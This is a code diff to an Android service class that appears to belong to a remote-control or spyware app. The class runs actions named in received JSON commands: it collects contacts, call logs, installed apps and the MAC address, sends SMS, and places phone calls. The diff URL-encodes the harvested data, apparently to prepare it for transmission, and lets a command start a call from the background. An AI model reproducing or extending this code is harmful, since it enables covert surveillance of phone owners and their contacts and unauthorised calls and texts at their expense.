@@ -16,6 +16,9 @@ import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 import android.util.Log;
 
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+import java.text.StringCharacterIterator;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -46,6 +49,7 @@ public class ActionService {
             getMacAddress(argjson);
             SendSMS(argjson);
             getInstalledApps(argjson);
+            call(argjson);
         }catch (JSONException ex){
             Log.d(TAG, ex.getMessage());
             this.result = "Error JSON";
@@ -105,7 +109,13 @@ public class ActionService {
                             new String[]{id}, null);
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        contacts.add(new String[]{name, phoneNo});
+                        try {
+                            contacts.add(new String[]{
+                                    URLEncoder.encode(name, "UTF-8"),
+                                    URLEncoder.encode(phoneNo, "UTF-8")});
+                        } catch (UnsupportedEncodingException e) {
+                            e.printStackTrace();
+                        }
                     }
                     pCur.close();
                 }
@@ -130,13 +140,17 @@ public class ActionService {
         Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
         if (cursor.moveToFirst()) {
             do {
-                callLog.add(new String[]{
-                        cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
-                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
-                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
-                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
-                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
-                });
+                try {
+                    callLog.add(new String[]{
+                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)), "UTF-8"),
+                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)), "UTF-8"),
+                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)), "UTF-8"),
+                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)), "UTF-8"),
+                            URLEncoder.encode(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)), "UTF-8")
+                    });
+                } catch (UnsupportedEncodingException e) {
+                    e.printStackTrace();
+                }
             } while (cursor.moveToNext());
         }
         this.result = new JSONArray(callLog).toString();
@@ -189,13 +203,16 @@ public class ActionService {
                 continue;
             }
 
-            packages.add(new String[]{
-                    p.applicationInfo.loadLabel(context.getPackageManager()).toString(),
-                    p.packageName,
-                    p.versionName,
-                    String.valueOf(p.versionCode)
-            });
-
+            try {
+                packages.add(new String[]{
+                        URLEncoder.encode(p.applicationInfo.loadLabel(context.getPackageManager()).toString(), "UTF-8"),
+                        URLEncoder.encode(p.packageName, "UTF-8"),
+                        URLEncoder.encode(p.versionName, "UTF-8"),
+                        URLEncoder.encode(String.valueOf(p.versionCode), "UTF-8")
+                });
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+            }
         }
 
         this.result = new JSONArray(packages).toString();
@@ -212,10 +229,12 @@ public class ActionService {
         JSONArray array = argjson.getJSONArray("call");
         num = array.get(0).toString();
         time = Long.valueOf(array.get(1).toString());
+        Log.d(TAG, num + " " + time);
 
         if (time > 1000) {
             Intent intent = new Intent(Intent.ACTION_CALL);
             intent.setData(Uri.parse("tel:" + num));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
 
             Log.d(TAG, "Start call");
@@ -242,5 +261,7 @@ public class ActionService {
                 } while (cursor.moveToNext());
             }
         }
+
+        this.result = "call done";
     }
 }
